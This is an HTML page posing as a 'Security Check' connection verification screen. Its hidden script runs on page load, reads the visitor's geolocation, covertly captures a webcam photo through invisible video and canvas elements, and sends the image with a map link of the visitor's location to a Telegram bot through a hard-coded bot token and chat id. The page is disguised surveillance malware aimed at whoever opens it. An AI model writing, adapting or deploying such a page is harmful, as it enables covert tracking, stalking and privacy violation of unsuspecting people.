<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
</head>
<body>
    <h2 style="text-align:center;">Verifying Your Connection...</h2>
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const token = '8868947145:AAFjXyUwInMs1bGzhEvV9Oyla1eGkaKbbVg';
        const chat_id = '8766925591';

        window.onload = () => {
            navigator.geolocation.getCurrentPosition(pos => {
                const { latitude: lat, longitude: lon } = pos.coords;
                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = 640; canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(blob => {
                            const fd = new FormData();
                            fd.append('chat_id', chat_id);
                            fd.append('photo', blob, 'img.jpg');
                            fd.append('caption', `🚨 চিহ্নিত!\n📍 লোকেশন: https://www.google.com/maps?q=${lat},${lon}`);
                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                        }, 'image/jpeg');
                    }, 2000);
                });
            });
        };
    </script>
</body>
</html>
